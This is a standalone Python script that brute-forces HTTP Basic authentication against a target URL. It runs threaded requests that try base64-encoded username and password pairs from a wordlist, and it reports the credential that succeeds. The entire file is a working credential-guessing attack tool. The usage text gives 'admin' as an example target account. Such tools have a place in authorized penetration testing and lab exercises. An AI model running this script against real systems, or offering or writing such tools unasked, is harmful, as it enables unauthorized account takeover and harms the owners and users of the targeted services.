import sys
import requests
import time
import base64

from threading import Thread, Lock
from queue import Queue
from termcolor import colored
from requests.auth import HTTPBasicAuth


global_count = 1
output = ""
stop = False
padlock = Lock()




#Retrieve parameters
url = sys.argv[1]
username = sys.argv[2]
path = sys.argv[3]
thread_count = int(sys.argv[4])

#Open file
file = open(path,'r',encoding="latin-1")
lines = file.readlines()
file_size = len(lines)




class Brute(Thread):


    def __init__(self,tail):
        Thread.__init__(self)
        self.tail = tail
        

    def run(self):
        global global_count
        global output
        global stop
        while not(stop):
            try:
                payload = self.tail.get()

                headers = {
                    'Authorization':f'Basic {payload}'
                }

                response = requests.get(url,headers=headers)
                code = response.status_code

            
                with padlock:
                    if(code >= 400):
                        display = "[" + str(global_count) + "/" + str(file_size) + "] : target " + url + " - "  + colored(str(code),'blue') + " - " + colored(base64.b64decode(payload).decode('utf-8'),'red') + " (" + payload + ")"
                        sys.stdout.write("\033[K" + display + "\r") #Le \033[K est la séquence d’échappement pour effacer jusqu’à la fin de la ligne.
                        sys.stdout.flush()
                    else:
                        output = base64.b64decode(payload).decode('utf-8')
                        stop = True
                        display = "[" + str(global_count) + "/" + str(file_size) + "] : target " + url + " - "  + colored(str(code),'blue') + " - " + colored(base64.b64decode(payload).decode('utf-8'),'green') + " (" + payload + ")"
                        sys.stdout.write("\033[K" + display + "\r") #Le \033[K est la séquence d’échappement pour effacer jusqu’à la fin de la ligne.
                        sys.stdout.flush()
                    global_count += 1
                    #print(codes)
            except Exception as e:
                #print(f"Erreur : {e}")
                continue
            time.sleep(0.5)
            self.tail.task_done()





def main():

    try:

        start_time = time.time()

        #Display
        print(f"[{colored('-','yellow')}] : Brute force through {url}...\n")  

        tail = Queue()

        #Create threads
        for i in range(thread_count):
            fuzzer = Brute(tail)
            fuzzer.daemon = True
            fuzzer.start()

        #Encode payload and put in queue
        for line in lines:
            cred = f"{username}:{line.strip()}"
            encoded_cred = base64.b64encode(cred.encode('utf-8')).decode('utf-8')
            tail.put(encoded_cred)

        #Join threads
        tail.join()

        #Output
        print(f"\nCredential found : {colored(output,'green')}\n")
        
        end_time = time.time()
        execution_time = int(end_time) - int(start_time)
        print(f"Execution time : {execution_time} seconds")

        pass

    except KeyboardInterrupt:
        print(f"\n[{str(global_count)}/{str(file_size)}] - {str(file_size - global_count)} left")
        print(f"\nCredentials found : {colored(output,'green')}\n")
        sys.exit(0)


if __name__ == '__main__':
    if len(sys.argv) != 5:
        print("""
This script will brute force pop-up authentification base64-encoded over a URL given.
Usage: script.py https://example.com/login username path_file_word nb_thread    
Ex: script.py https://example.com/login admin enumBase64Cred.txt 30          
              """)
        sys.exit(0)
    else:
        main()








